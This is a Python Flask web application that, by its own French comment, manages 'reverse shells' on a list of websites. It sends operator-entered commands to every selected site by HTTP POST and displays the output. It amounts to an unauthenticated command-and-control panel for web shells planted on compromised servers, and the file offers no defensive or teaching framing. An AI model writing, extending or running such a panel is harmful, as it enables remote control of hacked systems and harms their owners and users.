from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# Liste des sites web à contrôler avec leurs reverse shells
sites = []

@app.route('/')
def index():
    return render_template('index.html', sites=sites)

@app.route('/add_site', methods=['POST'])
def add_site():
    site_url = request.form['site_url']
    if site_url:
        sites.append(site_url)
    return render_template('index.html', sites=sites)

@app.route('/execute_command', methods=['POST'])
def execute_command():
    command = request.form['command']
    selected_sites = request.form.getlist('site')

    results = {}
    for site in selected_sites:
        try:
            response = requests.post(site, data={'command': command})
            results[site] = response.text
        except Exception as e:
            results[site] = str(e)

    return render_template('results.html', results=results)

if __name__ == '__main__':
    app.run(host="0.0.0.0", debug=False)